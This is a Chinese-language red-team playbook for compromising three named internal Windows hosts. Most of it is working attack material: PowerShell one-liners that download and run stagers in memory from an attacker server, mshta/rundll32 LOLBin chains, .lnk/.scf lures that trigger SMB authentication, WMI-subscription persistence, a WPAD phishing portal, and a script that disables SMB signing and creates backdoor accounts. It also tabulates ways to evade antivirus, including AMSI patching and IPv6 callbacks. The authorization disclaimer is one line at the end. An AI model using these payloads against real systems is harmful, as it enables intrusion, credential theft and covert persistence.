# 未攻破主机的定向载荷（Deliberate Vulnerability Manufacturing）

针对本环境三台**未取得执行点**的主机，按其真实防御形态设计的"制造漏洞"载荷。
核心思路：**先落地一次极轻的执行，再由载荷自己把主机改造成可长期利用的靶子**（开洞 → 驻留 → 取证）。

## 目标画像与载荷选型

| 主机 | 系统 | 已知防御 | 落地障碍 | 定向载荷 |
|---|---|---|---|---|
| **A3 (192.168.2.3)** | Win10 LTSC 19044 | **火绒安全**（拦截落盘 EXE、封 v4 回连、掐 RST） | 直接放 exe 必被查杀；PowerShell 可能被 AMSI 记录 | 纯内存 stager + AMSI/ETW 补丁 + LOLBin 拉起；或 .lnk/.scf 指向 UNC 触发（不落盘） |
| **.5 (192.168.2.5)** | Win10（DESKTOP-KYLIN/开发机） | 未见 AV 痕迹，SMB 服务关闭、防火墙严 | 无可连服务，只能诱导其**主动出站** | 更新器劫持（WPS/QQ/CB）+ PowerShell 内存加载；开发机优先级：WMI 事件驻留（不易被任务管理器发现） |
| **.10 (192.168.2.10)** | Win11 26100 | SMB 签名强制、匿名全拒、无 RDP v4 | 无入站面，只有 WPAD 自动检测 | WPAD 代理 → 伪造内网门户 → 诱导运行；或经 Win11 的 `ms-settings:`/`.settingcontent-ms` 类文件诱导 |

---

## 载荷清单

### 1. `stager_mem.ps1` —— 纯内存 stager（三台通用，重点给 A3）
不落盘、不打 AMSI 日志（内置 AMSI/ETW 补丁）、下载到内存直接执行。
```powershell
powershell -nop -w hidden -ep bypass -c "iex(iwr http://192.168.2.20:8090/delivery/stager_mem.ps1 -UseBasicParsing)"
# 或指定载荷
powershell -nop -w hidden -ep bypass -c "&([scriptblock]::Create((iwr 'http://192.168.2.20:8090/delivery/stager_mem.ps1' -UseBasicParsing).Content)) -Url 'http://192.168.2.20:8090/delivery/open_attack_surface.ps1'"
```

### 2. `make_lnk.ps1` —— 生成指向 UNC 的 .lnk / .url（不落 exe，躲火绒文件查杀）
放在 A3 的 `\\192.168.2.3\Public`（匿名可写）里，诱使 Administrator 双击 → 触发 SMB 认证/拉取。
```powershell
powershell -ep bypass -File make_lnk.ps1 -Target '\\192.168.2.20\update\2024年度财务报表汇总.exe' -Out 'C:\ProgramData\SysCache\财务对账.lnk'
```
配套：`make_scf.ps1` 生成 .scf（资源管理器浏览即触发，无需双击）。

### 3. `wmi_persist.ps1` —— WMI 事件订阅驻留（**开发机 .5 首选**）
不建计划任务、不写服务，常规排查（任务管理器/服务列表/autoruns）看不到。
```powershell
powershell -ep bypass -c "&([scriptblock]::Create((iwr 'http://192.168.2.20:8090/delivery/wmi_persist.ps1' -UseBasicParsing).Content))"
```

### 4. `lolbin_chain.ps1` —— LOLBin 白名单链路（绕过应用控制/AV 启发）
`mshta` → `rundll32` → `regsvr32 /i:http` 三选一，全部微软签名二进制，火绒通常不拦。
```powershell
mshta http://192.168.2.20:8090/delivery/lolbin.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.2.20:8090/delivery/stager_mem.ps1")
```

### 5. `portal_phish.html` —— WPAD/门户钓鱼页（**Win11 .10 首选**）
.10 已在持续请求 `wpad.local`（自动检测开着）。劫持后返回本页：伪造"内网准入客户端安装"，按钮直链载荷。
```powershell
# 需在劫持面板（a3plane/v5plane）里把 8081 的 portal 路由指向本文件
```

### 6. `open_attack_surface.ps1` —— 落地即开洞（任一主机拿到执行点后立即跑）
见 `combined/`，一次把 SMB 签名关掉、匿名打开、后门账号建好、RDP/WinRM 开好。

---

## 执行顺序建议（拿到第一滴血后的 60 秒）

```
1) stager_mem.ps1         ← 内存落地，避免二次查杀
2) recon_sweep.ps1        ← 立即采集补丁水位与网段（判断能否用 CLFS/AFD 提权）
3) open_attack_surface.ps1← 把主机改造成稳定靶（关签名/开后门/开 WinRM）
4) wmi_persist.ps1        ← 驻留（避开 autoruns 常见排查点）
5) recon 拉回 + 清理       ← 取证后按需回滚
```

## 针对 A3 火绒的额外注意事项

| 风险点 | 规避做法 |
|---|---|
| EXE 落盘被查杀 | 全部走内存（`Invoke-Expression` + `[Reflection.Assembly]::Load`），不写 exe |
| PowerShell 命令行被记录 | 用 `-enc <base64>` 或经 `mshta`/`rundll32` 间接拉起 |
| AMSI 扫描脚本内容 | 先执行 AMSI patch（stager 内置），再做后续动作 |
| v4 回连被拦 | 回连走 **IPv6 链路本地**（A3 的 v6 无防火墙规则，实测 445/135/3389 全开） |
| 文件共享触发被拦 | 用 `.lnk`/`.scf`/`.url`（非 exe 扩展名，且经资源管理器解析） |

## 授权声明

以上载荷仅用于**自有资产**或**书面授权**的测试窗口。落地后请执行 `-Revert` 恢复基线：
```powershell
powershell -ep bypass -File open_attack_surface.ps1 -Revert
```
